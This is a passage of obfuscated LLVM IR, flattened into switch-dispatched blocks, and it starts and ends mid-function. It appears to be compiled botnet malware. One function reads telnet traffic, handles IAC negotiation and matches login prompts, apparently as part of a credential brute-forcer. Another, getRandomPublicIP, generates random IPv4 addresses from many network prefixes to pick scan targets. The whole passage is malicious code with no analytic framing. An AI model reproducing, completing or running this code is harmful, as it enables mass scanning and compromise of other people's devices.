  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 -933610251, i32 -1276869521
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 361077391, i32 2067343780
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 361077391, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1276869521, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -1286778840, i32 450900324
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1342982170, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #5, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 1514870862, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -1165162607, i32 -707581562
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 450900324, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 1807375982, i32 -1639092140
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 1807375982, i32 520536733
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1263211672, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 -17378805, i32 806212644
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 1520752860, i32 106875977
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 1520752860, i32 -1272793467
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1263211672, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -1436044346, i32 -1804981183
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1263211672, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 -1084922481, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 204164153, i32 -118611189
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -1172635683, i32 1766197294
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 204164153, i32 1766197294
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 450900324, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 -1084922481, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 1097693795, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1826245793, i32 298613042
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 1263211672, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1263211672, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 152
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -2073338457, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2073338457, label %first
    i32 1424995426, label %20
    i32 2007601323, label %27
    i32 1725446616, label %31
    i32 -195857186, label %38
    i32 -250792683, label %42
    i32 955777568, label %49
    i32 -2079407790, label %53
    i32 -2040760930, label %60
    i32 1485447160, label %64
    i32 -1115142787, label %71
    i32 -533321688, label %75
    i32 18394946, label %82
    i32 -690619724, label %86
    i32 939289462, label %93
    i32 1770890831, label %97
    i32 -994252480, label %104
    i32 1532018370, label %108
    i32 -379406360, label %115
    i32 2114664027, label %119
    i32 -257410987, label %126
    i32 -764479447, label %130
    i32 -1441832474, label %137
    i32 -425009517, label %141
    i32 -254666528, label %148
    i32 -1050208205, label %152
    i32 1389896609, label %159
    i32 958165478, label %163
    i32 -1765274226, label %170
    i32 777639747, label %174
    i32 -1642633517, label %181
    i32 467155450, label %185
    i32 1764361734, label %192
    i32 -1789894340, label %196
    i32 -2079131367, label %203
    i32 -103657637, label %207
    i32 -159211952, label %214
    i32 -356546906, label %218
    i32 1105962159, label %225
    i32 1129688245, label %229
    i32 -886811160, label %236
    i32 976162565, label %240
    i32 1910526486, label %247
    i32 -1207796969, label %251
    i32 1173014218, label %258
    i32 936446353, label %262
    i32 -404863654, label %269
    i32 -1454595438, label %273
    i32 1201099970, label %280
    i32 352318712, label %284
    i32 -1232192400, label %291
    i32 -2060112404, label %295
    i32 -40905400, label %302
    i32 -273806587, label %306
    i32 -1683055098, label %313
    i32 -1423342246, label %317
    i32 -368445382, label %324
    i32 223545483, label %328
    i32 673366457, label %335
    i32 1898664501, label %339
    i32 528805526, label %346
    i32 -292611435, label %350
    i32 1566831087, label %357
    i32 1755088580, label %361
    i32 -137530279, label %368
    i32 1467803225, label %372
    i32 1945302362, label %379
    i32 -1040550795, label %383
    i32 1728803074, label %390
    i32 -1352425973, label %394
    i32 420427610, label %401
    i32 -1389790310, label %405
    i32 363768484, label %412
    i32 -1695849817, label %416
    i32 734359048, label %423
    i32 371110222, label %427
    i32 780758948, label %434
    i32 1764660162, label %438
    i32 1565126155, label %445
    i32 -1511690522, label %449
    i32 -903986680, label %456
    i32 943527825, label %460
    i32 644487590, label %467
    i32 -1913070330, label %471
    i32 810371470, label %478
    i32 -164461558, label %482
    i32 374570161, label %489
    i32 -1090793613, label %493
    i32 1886963637, label %500
    i32 1612336463, label %504
    i32 56089614, label %511
    i32 627377371, label %515
    i32 93877066, label %522
    i32 -1117879484, label %526
    i32 1778404666, label %533
    i32 -1109778750, label %537
    i32 576312287, label %544
    i32 1399910188, label %548
    i32 -370495099, label %555
    i32 -227790338, label %559
    i32 862080555, label %566
    i32 -848055595, label %570
    i32 -594141330, label %577
    i32 163446352, label %581
    i32 156995407, label %588
    i32 1197097519, label %592
    i32 -423961556, label %599
    i32 -777078577, label %603
    i32 1110982188, label %610
    i32 1659430705, label %614
    i32 267897640, label %621
    i32 1577857465, label %625
    i32 2013178534, label %632
    i32 -2112138654, label %636
    i32 -1544237705, label %643
    i32 -1165390008, label %647
    i32 1086449189, label %654
    i32 2137856409, label %658
    i32 -1453623883, label %665
    i32 1847208648, label %669
    i32 -438181337, label %676
    i32 -1851401784, label %680
    i32 -1222432460, label %687
    i32 -1391277074, label %691
    i32 -652346633, label %698
    i32 -383790656, label %702
    i32 107917869, label %709
    i32 -701844831, label %713
    i32 115726441, label %720
    i32 1061652470, label %724
    i32 -2031326778, label %731
    i32 498257638, label %735
    i32 -949209999, label %742
    i32 2117994951, label %746
    i32 -1319899888, label %753
    i32 -1229732709, label %757
    i32 433154673, label %764
    i32 2037564557, label %768
    i32 895991108, label %775
    i32 -1175213858, label %779
    i32 -666900308, label %786
    i32 2095816786, label %790
    i32 1877371147, label %797
    i32 -1375240177, label %801
    i32 -1299874840, label %808
    i32 1150416796, label %812
    i32 -1355717819, label %819
    i32 982015020, label %823
    i32 305953617, label %830
    i32 -1656666539, label %834
    i32 2037963687, label %841
    i32 -1231934440, label %845
    i32 -514597603, label %852
    i32 298156738, label %856
    i32 56830307, label %863
    i32 -435147411, label %867
    i32 -999357376, label %874
    i32 -102960119, label %878
    i32 1663612819, label %885
    i32 -1920852666, label %889
    i32 1343778636, label %896
    i32 1439141315, label %900
    i32 -1460997941, label %907
    i32 -1446628157, label %911
    i32 -2125976346, label %918
    i32 1002902248, label %922
    i32 -525326166, label %929
    i32 -737947666, label %933
    i32 687924486, label %940
    i32 -1756576000, label %944
    i32 -1380987550, label %951
    i32 2023966626, label %955
    i32 -122942446, label %962
    i32 1201379484, label %966
    i32 -1899563941, label %973
    i32 1550719471, label %977
    i32 -1162528705, label %984
    i32 -1951720048, label %988
    i32 -867953187, label %995
    i32 1832399953, label %999
    i32 1139878650, label %1006
    i32 1055597666, label %1010
    i32 1931441633, label %1017
    i32 152307803, label %1021
    i32 -36859192, label %1028
    i32 -1722499790, label %1032
    i32 -641508541, label %1039
    i32 -1566972697, label %1043
    i32 947144505, label %1050
    i32 -263370249, label %1054
    i32 944101528, label %1061
    i32 5427997, label %1065
    i32 -310429973, label %1072
    i32 -781616824, label %1076
    i32 1810869471, label %1083
    i32 -58954473, label %1087
    i32 -772561516, label %1094
    i32 313727483, label %1098
    i32 257907691, label %1105
    i32 -532116317, label %1109
    i32 288179423, label %1116
    i32 -980897138, label %1120
    i32 -1440161274, label %1127
    i32 -1213995260, label %1131
    i32 -1341385852, label %1138
    i32 329755256, label %1142
    i32 368851842, label %1149
    i32 -598884100, label %1153
    i32 1131381016, label %1160
    i32 961258324, label %1164
    i32 -1340615017, label %1171
    i32 -1886930395, label %1175
    i32 706160894, label %1182
    i32 -11728653, label %1186
    i32 -1206370748, label %1193
    i32 14145800, label %1197
    i32 1538657568, label %1204
    i32 1811388296, label %1208
    i32 2078146206, label %1215
    i32 -1696284198, label %1219
    i32 -1398780441, label %1226
    i32 -790497212, label %1230
    i32 -947274809, label %1237
    i32 360972582, label %1241
    i32 963885732, label %1248
    i32 -502790056, label %1252
    i32 -1214640375, label %1259
    i32 1597317165, label %1263
    i32 342868125, label %1270
    i32 -636021309, label %1274
    i32 -123623665, label %1281
    i32 -1780042729, label %1285
    i32 -1131001102, label %1292
    i32 -281490346, label %1296
    i32 -777003905, label %1303
    i32 -1504530583, label %1307
    i32 -699588222, label %1314
    i32 192822647, label %1318
    i32 -689281279, label %1325
    i32 52401347, label %1329
    i32 -1186604818, label %1336
    i32 -974746438, label %1340
    i32 1384606725, label %1347
    i32 1696081372, label %1351
    i32 1528613543, label %1358
    i32 -1853795652, label %1362
    i32 -438109201, label %1369
    i32 -1773672310, label %1373
    i32 -612892161, label %1380
    i32 539841695, label %1384
    i32 754014497, label %1391
    i32 984640344, label %1395
    i32 1361365703, label %1402
    i32 -138281709, label %1406
    i32 234364011, label %1413
    i32 1824402580, label %1417
    i32 -66376768, label %1424
    i32 1691113668, label %1428
    i32 1855172739, label %1435
    i32 1213482376, label %1439
    i32 -624468660, label %1446
    i32 1423139188, label %1450
    i32 -444246655, label %1457
    i32 -1760254050, label %1461
    i32 984205075, label %1468
    i32 266455108, label %1472
    i32 -702991579, label %1479
    i32 2002444611, label %1483
    i32 -851340953, label %1490
    i32 -80448585, label %1494
    i32 1180308803, label %1501
    i32 232815045, label %1505
    i32 -1572292043, label %1512
    i32 405974639, label %1516
    i32 391953876, label %1523
    i32 -2026415178, label %1527
    i32 -1981372409, label %1534
    i32 -2130282475, label %1538
    i32 -1539716234, label %1545
    i32 173308822, label %1549
    i32 1206821203, label %1556
    i32 -524581998, label %1560
    i32 -914929910, label %1567
    i32 -1212199824, label %1571
    i32 -541826049, label %1578
    i32 1892470502, label %1582
    i32 -1220703231, label %1589
    i32 -979531739, label %1593
    i32 696818140, label %1600
    i32 972235229, label %1604
    i32 -1843374991, label %1611
    i32 -664344919, label %1615
    i32 -2093276989, label %1622
    i32 -1820760619, label %1626
    i32 16900701, label %1633
    i32 -1921684222, label %1637
    i32 -148289995, label %1644
    i32 -1823875023, label %1648
    i32 1452369808, label %1655
    i32 692784457, label %1659
    i32 960360385, label %1666
    i32 2031895149, label %1670
    i32 914365591, label %1677
    i32 -844324335, label %1681
    i32 553927101, label %1688
    i32 -418487762, label %1692
    i32 -1920326422, label %1699
    i32 -36198929, label %1703
    i32 829465366, label %1710
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, 0
  %19 = select i1 %18, i32 1424995426, i32 2007601323
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %21, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i32 %23, i32 %25)
  store i32 2007601323, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %1, align 4
  %29 = icmp eq i32 %28, 1
  %30 = select i1 %29, i32 1725446616, i32 -195857186
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %36 = zext i8 %35 to i32
  %37 = call i32 (i8*, i8*, ...) @szprintf(i8* %32, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 %34, i32 %36)
  store i32 -195857186, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %1, align 4
  %40 = icmp eq i32 %39, 2
  %41 = select i1 %40, i32 -250792683, i32 955777568
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %44 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %45 = zext i8 %44 to i32
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %47 = zext i8 %46 to i32
  %48 = call i32 (i8*, i8*, ...) @szprintf(i8* %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i32 %45, i32 %47)
  store i32 955777568, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  %51 = icmp eq i32 %50, 3
  %52 = select i1 %51, i32 -2079407790, i32 -2040760930
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, i8*, ...) @szprintf(i8* %54, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.45, i32 0, i32 0), i32 %56, i32 %58)
  store i32 -2040760930, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %1, align 4
  %62 = icmp eq i32 %61, 4
  %63 = select i1 %62, i32 1485447160, i32 -1115142787
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %69 = zext i8 %68 to i32
  %70 = call i32 (i8*, i8*, ...) @szprintf(i8* %65, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.46, i32 0, i32 0), i32 %67, i32 %69)
  store i32 -1115142787, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %1, align 4
  %73 = icmp eq i32 %72, 5
  %74 = select i1 %73, i32 -533321688, i32 18394946
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %78 = zext i8 %77 to i32
  %79 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %80 = zext i8 %79 to i32
  %81 = call i32 (i8*, i8*, ...) @szprintf(i8* %76, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.47, i32 0, i32 0), i32 %78, i32 %80)
  store i32 18394946, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %1, align 4
  %84 = icmp eq i32 %83, 6
  %85 = select i1 %84, i32 -690619724, i32 939289462
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %89 = zext i8 %88 to i32
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 (i8*, i8*, ...) @szprintf(i8* %87, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.48, i32 0, i32 0), i32 %89, i32 %91)
  store i32 939289462, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %1, align 4
  %95 = icmp eq i32 %94, 7
  %96 = select i1 %95, i32 1770890831, i32 -994252480
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %99 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %100 = zext i8 %99 to i32
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %102 = zext i8 %101 to i32
  %103 = call i32 (i8*, i8*, ...) @szprintf(i8* %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i32 %100, i32 %102)
  store i32 -994252480, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %1, align 4
  %106 = icmp eq i32 %105, 8
  %107 = select i1 %106, i32 1532018370, i32 -379406360
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %113 = zext i8 %112 to i32
  %114 = call i32 (i8*, i8*, ...) @szprintf(i8* %109, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.50, i32 0, i32 0), i32 %111, i32 %113)
  store i32 -379406360, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* %1, align 4
  %117 = icmp eq i32 %116, 9
  %118 = select i1 %117, i32 2114664027, i32 -257410987
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %124 = zext i8 %123 to i32
  %125 = call i32 (i8*, i8*, ...) @szprintf(i8* %120, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.51, i32 0, i32 0), i32 %122, i32 %124)
  store i32 -257410987, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* %1, align 4
  %128 = icmp eq i32 %127, 10
  %129 = select i1 %128, i32 -764479447, i32 -1441832474
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %132 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %133 = zext i8 %132 to i32
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = call i32 (i8*, i8*, ...) @szprintf(i8* %131, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i32 %133, i32 %135)
  store i32 -1441832474, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %1, align 4
  %139 = icmp eq i32 %138, 11
  %140 = select i1 %139, i32 -425009517, i32 -254666528
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %144 = zext i8 %143 to i32
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %146 = zext i8 %145 to i32
  %147 = call i32 (i8*, i8*, ...) @szprintf(i8* %142, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.53, i32 0, i32 0), i32 %144, i32 %146)
  store i32 -254666528, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %1, align 4
  %150 = icmp eq i32 %149, 12
  %151 = select i1 %150, i32 -1050208205, i32 1389896609
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %155 = zext i8 %154 to i32
  %156 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %157 = zext i8 %156 to i32
